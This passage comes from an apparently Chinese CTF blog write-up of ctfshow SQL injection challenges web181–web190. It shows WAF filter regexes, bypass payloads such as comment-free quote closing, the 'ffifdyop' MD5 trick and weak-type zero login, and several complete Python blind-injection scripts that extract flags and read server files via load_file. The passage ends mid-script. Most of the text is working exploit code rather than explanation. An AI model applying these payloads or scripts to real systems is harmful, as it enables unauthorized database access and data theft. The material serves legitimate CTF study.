<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/ |\*|\x09|\x0a|\x0b|\x0c|\x00|\x0d|\xa0|\x23|\#|file|into|select/i&#x27;</span>, <span class="hljs-variable">$str</span>);<br></code></pre></td></tr></table></figure>

<h3 id="0x01-6"><a href="#0x01-6" class="headerlink" title="0x01"></a>0x01</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1</span><span class="hljs-string">&#x27;%0cor%0c1=1--%0c</span><br></code></pre></td></tr></table></figure>

<h3 id="0x02-6"><a href="#0x02-6" class="headerlink" title="0x02"></a>0x02</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">-1</span><span class="hljs-string">&#x27;or(id=26)and&#x27;</span><span class="hljs-number">1</span><br></code></pre></td></tr></table></figure>

<p>x1✌的简述，and 的优先级是高于 or 的，会执行后面的,下面<strong>贴原文</strong>，挺好理解的</p>
<p>语句实际的执行顺序如下 (我们把距离 and 两边最近的相关操作都用括号括起来以便于理解, 并且补全空格)</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> id,username,password <span class="hljs-keyword">from</span> ctfshow_user <span class="hljs-keyword">where</span> (username <span class="hljs-operator">!=</span> <span class="hljs-string">&#x27;flag&#x27;</span> <span class="hljs-keyword">and</span> id<span class="hljs-operator">=</span><span class="hljs-string">&#x27;-1&#x27;</span>) <span class="hljs-keyword">or</span> (id<span class="hljs-operator">=</span><span class="hljs-number">26</span> <span class="hljs-keyword">and</span> <span class="hljs-string">&#x27;1&#x27;</span>) limit <span class="hljs-number">1</span>;<br></code></pre></td></tr></table></figure>

<p>首先因为输出只能输出一行数据, 需要 <code>id=-1</code> 来使前一条查询纪录为空, 使得前一条包含 and 的语句为 false</p>
<p>然后开始判断后一个括号内的操作, <code>id=26 and &#39;1&#39;</code> 与 <code>id=26</code> 等价 (注意 <code>id=26 or &#39;1&#39;</code> 相当于查询全部内容, 因为 or 后一句永远是 true, 即查询存在的纪录)</p>
<p>因为前一个括号内容不成立(返回空纪录), 后一个括号内的内容成立, 于是通过 or 符号, 我们查询了 <code>id=26</code> 的纪录并显示出来</p>
<p>因为空格被过滤了, 所以使用 <code>()</code> 进行绕过, 测试可知 flag 所在账户的 id 值是 26, 于是构造 <code>or(id=26)</code> 来查询 id&#x3D;26 的数据</p>
<p>最后面的 <code>and&#39;1</code> 是闭合后面的单引号 (因为注释被过滤掉了)</p>
<p>最终的 payload 为 <code>-1&#39;or(id=26)and&#39;1</code>, 其实 <code>-1&#39;or(id=26)and&#39;1&#39;=1</code> 也是可以的</p>
<h2 id="web182"><a href="#web182" class="headerlink" title="web182"></a>web182</h2><p>同web181,自己参照</p>
<h2 id="web183"><a href="#web183" class="headerlink" title="web183"></a>web183</h2><p>查找语句做了限制</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;select count(pass) from &quot;</span>.<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;tableName&#x27;</span>].<span class="hljs-string">&quot;;&quot;</span>;<br></code></pre></td></tr></table></figure>

<p>是从from后来开始注入，没有直接的回显，需要写个盲注的脚本</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br>dicts = <span class="hljs-string">&#x27;0123456789abcdefghijklmnopqrstuvwxyz-&#125;&#x27;</span><br>flag = <span class="hljs-string">&#x27;ctfshow&#123;&#x27;</span><br>url = <span class="hljs-string">&#x27;http://3edbba86-cec1-4666-8bcc-39e839605a1c.challenge.ctf.show/select-waf.php&#x27;</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_flag_char</span>(<span class="hljs-params">current_flag</span>):<br>    <span class="hljs-keyword">for</span> char <span class="hljs-keyword">in</span> dicts:<br>        data = &#123;<span class="hljs-string">&#x27;tableName&#x27;</span>: <span class="hljs-string">f&quot;(ctfshow_user)where(pass)like(&#x27;<span class="hljs-subst">&#123;current_flag + char&#125;</span>%&#x27;)&quot;</span>&#125;<br><br>        <span class="hljs-keyword">try</span>:<br>            res = requests.post(url, data=data)<br>            <span class="hljs-keyword">if</span> res.text.find(<span class="hljs-string">&#x27;$user_count = 1&#x27;</span>) != -<span class="hljs-number">1</span>:<br>                <span class="hljs-keyword">return</span> char<br>        <span class="hljs-keyword">except</span> requests.RequestException <span class="hljs-keyword">as</span> e:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;请求失败: <span class="hljs-subst">&#123;e&#125;</span>&quot;</span>)<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span><br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>    char = get_flag_char(flag)<br>    <span class="hljs-keyword">if</span> char:<br>        flag += char<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;当前 flag: <span class="hljs-subst">&#123;flag&#125;</span>&quot;</span>)<br>        <span class="hljs-keyword">if</span> char == <span class="hljs-string">&#x27;&#125;&#x27;</span>:<br>            <span class="hljs-keyword">break</span><br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;无法继续匹配字符，可能已到达结尾或发生错误。&quot;</span>)<br>        <span class="hljs-keyword">break</span><br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;最终 flag: <span class="hljs-subst">&#123;flag&#125;</span>&quot;</span>)<br></code></pre></td></tr></table></figure>

<h2 id="web184"><a href="#web184" class="headerlink" title="web184"></a>web184</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/\*|\x09|\x0a|\x0b|\x0c|\0x0d|\xa0|\x00|\#|\x23|file|\=|or|\x7c|select|and|flag|into|where|\x26|\&#x27;|\&quot;|union|\`|sleep|benchmark/i&#x27;</span>, <br></code></pre></td></tr></table></figure>

<p>本题的主要多过滤了where,可以利用having进行绕过，配合group by一起使用</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> time<br><span class="hljs-keyword">import</span> binascii<br>dicts = <span class="hljs-string">&#x27;0123456789abcdefghijklmnopqrstuvwxyz-&#125;&#x27;</span><br>flag = <span class="hljs-string">&#x27;ctfshow&#123;&#x27;</span><br>url = <span class="hljs-string">&#x27;http://7d2f63f3-cdef-40f1-bb7b-c5865311ee95.challenge.ctf.show/select-waf.php&#x27;</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">tohex</span>(<span class="hljs-params">string</span>):<br>    <span class="hljs-keyword">return</span> binascii.hexlify(string.encode(<span class="hljs-string">&#x27;utf-8&#x27;</span>)).decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>)<br><span class="hljs-keyword">with</span> requests.Session() <span class="hljs-keyword">as</span> session:<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-number">64</span>):<br>        <span class="hljs-keyword">for</span> s <span class="hljs-keyword">in</span> dicts:<br>            data = &#123;<span class="hljs-string">&#x27;tableName&#x27;</span>: <span class="hljs-string">f&quot;ctfshow_user group by pass having pass like 0x<span class="hljs-subst">&#123;tohex(flag + s + <span class="hljs-string">&#x27;%&#x27;</span>)&#125;</span>&quot;</span>&#125;<br>            <span class="hljs-keyword">try</span>:<br>                res = session.post(url, data=data)<br>                <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;$user_count = 1&#x27;</span> <span class="hljs-keyword">in</span> res.text:<br>                    flag += s<br>                    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;Current flag: <span class="hljs-subst">&#123;flag&#125;</span>&quot;</span>)<br>                    <span class="hljs-keyword">break</span><br>            <span class="hljs-keyword">except</span> requests.RequestException <span class="hljs-keyword">as</span> e:<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;Error occurred: <span class="hljs-subst">&#123;e&#125;</span>&quot;</span>)<br>            time.sleep(<span class="hljs-number">0.5</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;Final flag: <span class="hljs-subst">&#123;flag&#125;</span>&quot;</span>)<br></code></pre></td></tr></table></figure>

<p>利用hex的进制转化进行比较得到flag</p>
<h2 id="web185"><a href="#web185" class="headerlink" title="web185"></a>web185</h2><p>在前面的基础上还过滤了数字，跟着大师傅学学脚本</p>
<p>思路是利用true是1的原理就行构造数字</p>
<h3 id="0x01-7"><a href="#0x01-7" class="headerlink" title="0x01"></a>0x01</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> time<br><span class="hljs-keyword">import</span> string<br><br>url = <span class="hljs-string">&quot;http://0a600219-be65-4f96-a0b3-28d5e93923db.challenge.ctf.show/select-waf.php&quot;</span><br><br>dicts = string.digits+string.ascii_lowercase+<span class="hljs-string">&quot;-&quot;</span>+<span class="hljs-string">&quot;&#125;&quot;</span><br>flag = [<span class="hljs-string">&#x27;c&#x27;</span>, <span class="hljs-string">&#x27;t&#x27;</span>, <span class="hljs-string">&#x27;f&#x27;</span>, <span class="hljs-string">&#x27;s&#x27;</span>, <span class="hljs-string">&#x27;h&#x27;</span>, <span class="hljs-string">&#x27;o&#x27;</span>, <span class="hljs-string">&#x27;w&#x27;</span>, <span class="hljs-string">&#x27;&#123;&#x27;</span>]<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">tofunc</span>(<span class="hljs-params">n</span>):<br>    strs = <span class="hljs-string">&#x27;&#x27;</span><br>    <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(n):<br>        strs += <span class="hljs-string">&#x27;+true&#x27;</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;char(&#x27;</span> + strs + <span class="hljs-string">&#x27;)&#x27;</span><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span> (<span class="hljs-number">1</span>,<span class="hljs-number">64</span>):<br>    <span class="hljs-keyword">for</span> s <span class="hljs-keyword">in</span> dicts:<br>        payload = flag + <span class="hljs-built_in">list</span>(s)<br>        payload.append(<span class="hljs-string">&quot;%&quot;</span>) <span class="hljs-comment"># 进行匹配</span><br>        concat_payload = <span class="hljs-string">&#x27;concat(&#x27;</span> +<span class="hljs-string">&#x27;,&#x27;</span>.join([tofunc(<span class="hljs-built_in">ord</span>(x))<span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> payload])+<span class="hljs-string">&#x27;)&#x27;</span><br>        data = &#123;<span class="hljs-string">&#x27;tableName&#x27;</span>:<span class="hljs-string">&#x27;ctfshow_user group by pass having pass like &#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(concat_payload)&#125;<br>        res=requests.post(url,data=data)<br>        <span class="hljs-keyword">if</span> res.text.find(<span class="hljs-string">&#x27;$user_count = 0&#x27;</span>) == -<span class="hljs-number">1</span>:<br>            flag.append(s)<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;&#x27;</span>.join(flag))<br>            time.sleep(<span class="hljs-number">3</span>)<br>            <span class="hljs-keyword">break</span><br></code></pre></td></tr></table></figure>

<h3 id="0x02-7"><a href="#0x02-7" class="headerlink" title="0x02"></a>0x02</h3><p>另外附上yu师傅的脚本</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#author:yu22x</span><br><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> string<br>url=<span class="hljs-string">&quot;http://8319afbf-281c-4a73-b14e-a29426d0e556.challenge.ctf.show/select-waf.php&quot;</span><br>s=<span class="hljs-string">&#x27;0123456789abcdef-&#123;&#125;&#x27;</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">convert</span>(<span class="hljs-params">strs</span>):<br>  t=<span class="hljs-string">&#x27;concat(&#x27;</span><br>  <span class="hljs-keyword">for</span> s <span class="hljs-keyword">in</span> strs:<br>    t+= <span class="hljs-string">&#x27;char(true&#x27;</span>+<span class="hljs-string">&#x27;+true&#x27;</span>*(<span class="hljs-built_in">ord</span>(s)-<span class="hljs-number">1</span>)+<span class="hljs-string">&#x27;),&#x27;</span><br>  <span class="hljs-keyword">return</span> t[:-<span class="hljs-number">1</span>]+<span class="hljs-string">&quot;)&quot;</span><br>flag=<span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">45</span>):<br>  <span class="hljs-built_in">print</span>(i)<br>  <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> s:<br>    d = convert(<span class="hljs-string">f&#x27;^ctfshow<span class="hljs-subst">&#123;flag+j&#125;</span>&#x27;</span>)<br>    data=&#123;<br>    <span class="hljs-string">&#x27;tableName&#x27;</span>:<span class="hljs-string">f&#x27; ctfshow_user group by pass having pass regexp(<span class="hljs-subst">&#123;d&#125;</span>)&#x27;</span><br>    &#125;<br>    <span class="hljs-comment">#print(data)</span><br>    r=requests.post(url,data=data)<br>    <span class="hljs-comment">#print(r.text)</span><br>    <span class="hljs-keyword">if</span>(<span class="hljs-string">&quot;user_count = 1&quot;</span>  <span class="hljs-keyword">in</span> r.text):<br>      flag+=j<br>      <span class="hljs-built_in">print</span>(flag)<br>      <span class="hljs-keyword">if</span> j==<span class="hljs-string">&#x27;&#125;&#x27;</span>:<br>        exit(<span class="hljs-number">0</span>)<br>      <span class="hljs-keyword">break</span><br></code></pre></td></tr></table></figure>

<h2 id="web186"><a href="#web186" class="headerlink" title="web186"></a>web186</h2><p>同上题，两个脚本都可以使用，个人测评下来yu师傅的脚本快一点</p>
<h2 id="web187"><a href="#web187" class="headerlink" title="web187"></a>web187</h2><p>早有耳闻的一个sql的MD5绕过，一直知道这个知识点，但是刷到的很少先上payload</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">admin ffifdyop<br></code></pre></td></tr></table></figure>

<p>需要抓包看回显得到flag，具体的分析，<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_43427482/article/details/109849590">文章</a>这里简单的阐述一下内容，正常的MD5加密默认是32位，是以md5(‘xxx’,false)</p>
<p>但是使用md5(‘xxx’,true)进行加密转化的时候，会在这个基础上将字符串分割成16组然后每组转化为二进制再十进制，最后通过ASCII转化为字符串对 <code>ffifdyop</code> 字符串进行加密的时候, 会出现 <code>&#39;or&#39;6</code>, 相当于万能密码，以下是常用的两个payload</p>
<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs markdown">ffifdyop<br>129581926211651571912466741651878684928<br></code></pre></td></tr></table></figure>

<h2 id="web188"><a href="#web188" class="headerlink" title="web188"></a>web188</h2><p>都传0就可以绕过了，记得bp抓包</p>
<p>判断是<code>username=&#123;$username&#125;</code>，并没有引号包裹，那么就可以输入数字了。数字和字符串的匹配是弱类型比较，字符串会转换为数字，如<code>0==admin</code>，那么如果输入的username是0，则会匹配所有开头不是数字或者为0的字符串和数字0。</p>
<p>看password的判断，也是弱类型的比较，那么也直接输入0，尝试登录一个用户名和pass的开头是字母或是0的用户。</p>
<h2 id="web189"><a href="#web189" class="headerlink" title="web189"></a>web189</h2><p>hint是在api&#x2F;index.php里，先尝试了上题的payload没有成功</p>
<p>尝试输入用户为1和0,一个是查询失败，一个是密码错误，说明为1的时候不存在用户，利用这里进行注入，参考参考脚本吧</p>
<p><code>load_file()</code> 是 MySQL 中的一个函数，用于读取服务器上的文件。它能够从指定的文件路径读取文件内容，并将其作为字符串返回。</p>
<p><code>regexp</code> 是 MySQL 中用于正则表达式匹配的操作符。它的作用是将文件内容与正则表达式进行匹配。</p>
<h3 id="0x01-8"><a href="#0x01-8" class="headerlink" title="0x01"></a>0x01</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> string<br>dicts=string.digits+string.ascii_lowercase+<span class="hljs-string">&quot;-&quot;</span>+<span class="hljs-string">&quot;&#125;&quot;</span><br>url = <span class="hljs-string">&#x27;http://91a55175-5819-43ae-bd47-e9b866b79eeb.challenge.ctf.show/api/index.php&#x27;</span><br>flag = <span class="hljs-string">&#x27;ctfshow&#123;&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-number">64</span>):<br>    <span class="hljs-keyword">for</span> s <span class="hljs-keyword">in</span> dicts:<br>        payload = <span class="hljs-string">&#x27;if(load_file(\&#x27;/var/www/html/api/index.php\&#x27;)regexp(\&#x27;&#123;&#125;\&#x27;),1,0)&#x27;</span>.<span class="hljs-built_in">format</span>(flag+s)<br>        res = requests.post(url, data=&#123;<span class="hljs-string">&#x27;username&#x27;</span>:payload, <span class="hljs-string">&#x27;password&#x27;</span>:<span class="hljs-string">&#x27;1&#x27;</span>&#125;)<br>        <span class="hljs-keyword">if</span> res.text.find(<span class="hljs-string">&#x27;67e5&#x27;</span>) != -<span class="hljs-number">1</span>:<br>            flag += s<br>            <span class="hljs-built_in">print</span>(flag)<br>            <span class="hljs-keyword">break</span><br></code></pre></td></tr></table></figure>

<h3 id="0x02-8"><a href="#0x02-8" class="headerlink" title="0x02"></a>0x02</h3><p>还有官p</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> time<br><br>url = <span class="hljs-string">&quot;http://91a55175-5819-43ae-bd47-e9b866b79eeb.challenge.ctf.show/api/index.php&quot;</span><br>flagstr = <span class="hljs-string">&quot;&#125;&#123;&lt;&gt;$=,;_ &#x27;abcdefghijklmnopqr-stuvwxyz0123456789&quot;</span><br><br>flag = <span class="hljs-string">&quot;&quot;</span><br><span class="hljs-comment">#这个位置，是群主耗费很长时间跑出来的位置~</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">257</span>,<span class="hljs-number">257</span>+<span class="hljs-number">60</span>):<br>	<span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> flagstr:<br>		data=&#123;<br>		<span class="hljs-string">&quot;username&quot;</span>:<span class="hljs-string">&quot;if(substr(load_file(&#x27;/var/www/html/api/index.php&#x27;),&#123;&#125;,1)=(&#x27;&#123;&#125;&#x27;),1,0)&quot;</span>.<span class="hljs-built_in">format</span>(i,x),<br>		<span class="hljs-string">&quot;password&quot;</span>:<span class="hljs-string">&quot;0&quot;</span><br>		&#125;<br>		<span class="hljs-built_in">print</span>(data)<br>		response = requests.post(url,data=data)<br>		time.sleep(<span class="hljs-number">0.3</span>)<br>		<span class="hljs-comment"># 8d25是username=1时的页面返回内容包含的，具体可以看上面的截图~</span><br>		<span class="hljs-keyword">if</span> response.text.find(<span class="hljs-string">&quot;8d25&quot;</span>)&gt;<span class="hljs-number">0</span>:<br>			<span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;++++++++++++++++++ &#123;&#125; is right&quot;</span>.<span class="hljs-built_in">format</span>(x))<br>			flag+=x<br>			<span class="hljs-keyword">break</span><br>		<span class="hljs-keyword">else</span>:<br>			<span class="hljs-keyword">continue</span><br>	<span class="hljs-built_in">print</span>(flag)<br></code></pre></td></tr></table></figure>

<h2 id="web190"><a href="#web190" class="headerlink" title="web190"></a>web190</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">where username = <span class="hljs-string">&#x27;&#123;$username&#125;&#x27;</span><span class="hljs-string">&quot;;</span><br></code></pre></td></tr></table></figure>

<p>根据这个可以用或进行绕过尝试注入得到flag，还是用盲注写</p>
<h3 id="0x01-9"><a href="#0x01-9" class="headerlink" title="0x01"></a>0x01</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> string<br><span class="hljs-keyword">import</span>  time<br>dicts=string.digits+string.ascii_lowercase+<span class="hljs-string">&quot;-&quot;</span>+<span class="hljs-string">&quot;&#123;&#125;&quot;</span>+<span class="hljs-string">&quot;,&quot;</span><br>url = <span class="hljs-string">&#x27;http://27c9e10a-b6cd-4bcf-86e5-5a067c06f56e.challenge.ctf.show/api/index.php&#x27;</span><br>flag = <span class="hljs-string">&#x27;&#x27;</span><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">64</span>):<br>  <span class="hljs-keyword">for</span> s <span class="hljs-keyword">in</span> dicts:<br>    <span class="hljs-comment">#payload = &#x27;select group_concat(table_name) from information_schema.tables where table_schema=database()&#x27;</span><br>    <span class="hljs-comment">#payload = &#x27;select group_concat(column_name) from information_schema.columns where table_name=\&#x27;ctfshow_fl0g\&#x27; and table_schema=database()&#x27;</span><br>    payload = <span class="hljs-string">&#x27;select f1ag from ctfshow_fl0g&#x27;</span><br>    s_payload = <span class="hljs-string">&#x27;admin\&#x27; and if(substr((&#123;&#125;),&#123;&#125;,1)=\&#x27;&#123;&#125;\&#x27;,1,0)#&#x27;</span>.<span class="hljs-built_in">format</span>(payload,i,s)<br>    res = requests.post(url,data=&#123;<span class="hljs-string">&#x27;username&#x27;</span>:s_payload,<span class="hljs-string">&#x27;password&#x27;</span>:<span class="hljs-string">&#x27;1&#x27;</span>&#125; )<br>    <span class="hljs-keyword">if</span> res.text.find(<span class="hljs-string">&#x27;5bc6&#x27;</span>) != -<span class="hljs-number">1</span>:<br>      flag += s<br>      <span class="hljs-built_in">print</span>(flag)<br>      time.sleep(<span class="hljs-number">0.5</span>)<br>      <span class="hljs-keyword">break</span><br></code></pre></td></tr></table></figure>

<h3 id="0x02-9"><a href="#0x02-9" class="headerlink" title="0x02"></a>0x02</h3><p>利用二分法ASCII来写</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> sys<br><span class="hljs-keyword">import</span> time<br><br>url = <span class="hljs-string">&quot;http://36e8713a-b1fb-49c2-badb-4c4d66f5d1cb.challenge.ctf.show/api/&quot;</span><br>flag = <span class="hljs-string">&quot;&quot;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">60</span>):<br>    <span class="hljs-built_in">max</span> = <span class="hljs-number">127</span><br>    <span class="hljs-built_in">min</span> = <span class="hljs-number">32</span><br>    <span class="hljs-keyword">while</span> <span class="hljs-number">1</span>:<br>        mid = (<span class="hljs-built_in">max</span>+<span class="hljs-built_in">min</span>)&gt;&gt;<span class="hljs-number">1</span><br>        <span class="hljs-keyword">if</span>(<span class="hljs-built_in">min</span> == mid):<br>            flag += <span class="hljs-built_in">chr</span>(mid)<br>            <span class="hljs-built_in">print</span>(flag)<br>            <span class="hljs-keyword">break</span><br>        <span class="hljs-comment">#payload = &quot;admin&#x27;and (ascii(substr((select database()),&#123;&#125;,1))&lt;&#123;&#125;)#&quot;.format(i,mid)</span><br>        <span class="hljs-comment">#ctfshow_web</span><br>        <span class="hljs-comment">#payload = &quot;admin&#x27;and (ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),&#123;&#125;,1))&lt;&#123;&#125;)#&quot;.format(i,mid)</span><br>        <span class="hljs-comment">#ctfshow_fl0g</span><br>        <span class="hljs-comment">#payload = &quot;admin&#x27;and (ascii(substr((select group_concat(column_name) from information_schema.columns where table_name=&#x27;ctfshow_fl0g&#x27;),&#123;&#125;,1))&lt;&#123;&#125;)#&quot;.format(i,mid)</span><br>        <span class="hljs-comment">#id,f1ag</span><br>        payload = <span class="hljs-string">&quot;admin&#x27;and (ascii(substr((select f1ag from ctfshow_fl0g),&#123;&#125;,1))&lt;&#123;&#125;)#&quot;</span>.<span class="hljs-built_in">format</span>(i,mid)<br><br>        data = &#123;<br>            <span class="hljs-string">&quot;username&quot;</span>:payload,<br>            <span class="hljs-string">&quot;password&quot;</span>:<span class="hljs-number">0</span>,<br>        &#125;<br>        res = requests.post(url = url,data =data)<br>        time.sleep(<span class="hljs-number">0.3</span>)<br>        <span class="hljs-keyword">if</span> res.text.find(<span class="hljs-string">&quot;8bef&quot;</span>)&gt;<span class="hljs-number">0</span>:<br>            <span class="hljs-built_in">max</span> = mid<br>        <span 